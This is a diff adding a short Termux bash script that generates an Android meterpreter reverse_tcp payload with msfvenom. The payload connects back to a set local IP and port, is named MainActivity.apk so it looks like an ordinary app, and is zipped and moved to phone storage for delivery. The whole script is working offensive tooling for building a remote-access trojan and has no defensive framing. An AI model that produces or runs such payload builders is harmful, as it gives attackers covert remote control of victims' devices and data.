@@ -1,0 +1,26 @@
+#!/data/data/com.termux/files/usr/bin/bash
+#
+if [ -f MainActivity.apk ]; then
+     rm MainActivity.apk
+fi
+#
+if [ -f /storage/emulated/0/payload.zip ]; then
+     rm /storage/emulated/0/payload.zip
+fi
+#
+echo "Creating new payload..."
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.13 LPORT=4444 RPORT=5555 --arch=dalvik --platform=android -o MainActivity.apk > mkpayload.txt 2>&1
+#
+if [ -f MainActivity.apk ]; then
+     echo "Creating new zip archive file."
+     zip -9 payload.zip MainActivity.apk
+     echo "Testing zip file integrity."
+     zip -T payload.zip
+     echo "Moving the zip archive file to internal storage."
+     mv payload.zip /storage/emulated/0/payload.zip
+     ls -al /storage/emulated/0/payload.zip
+fi
+#
+exit 0
+#
+# EOF
